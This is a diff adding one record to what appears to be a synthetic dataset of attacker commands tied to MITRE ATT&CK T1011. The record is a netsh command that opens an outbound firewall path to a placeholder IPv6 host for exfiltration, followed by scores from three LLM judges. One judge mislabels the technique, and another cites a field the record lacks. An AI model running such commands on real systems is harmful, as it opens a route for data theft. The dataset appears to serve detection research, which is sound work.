@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh advfirewall firewall add rule name=\"exfil_out_tcp6_49444\" dir=out action=allow enable=yes protocol=TCP remoteport=49444 remoteip=2001:db8:bad:cafe::44 profile=any",
+  "explanation": "Adds a narrowly scoped outbound firewall rule to allow IPv6 TCP egress to a specific high port/host used for alternate-medium exfiltration (T1011).",
+  "rationale_steps": [
+    "Open only the exact IPv6 destination and high TCP port needed for exfiltration.",
+    "Minimize side effects by scoping to a single remote IP and port.",
+    "Permit exfil over a non-standard IPv6 path unlikely to be blocked by default."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-53a96244",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed netsh advfirewall rule with balanced quoting and valid parameters (dir, action, enable, protocol, remoteport, remoteip, profile) that is parseable in PowerShell.",
+        "semantic_score": 3,
+        "semantic_justification": "It would add a specific outbound IPv6 TCP allow rule as claimed, but requires administrative privileges and does not itself automate or perform exfiltration, making alignment to T1011 only indirect.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T03:30:20.520582Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for the netsh advfirewall firewall add rule command, including properly formatted parameters and values.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 (Automated Exfiltration) by creating a firewall rule that would allow outbound traffic to a specific IPv6 address and port that could be used for data exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:30:22.998923Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct `netsh` syntax with valid parameters and values for adding an advanced firewall rule.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command's design aligns with enabling automated exfiltration via T1011, the stated 'Privilege: None' is incorrect, as adding firewall rules requires Administrator privileges, rendering the command infeasible under the given context.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:45:38.870798Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
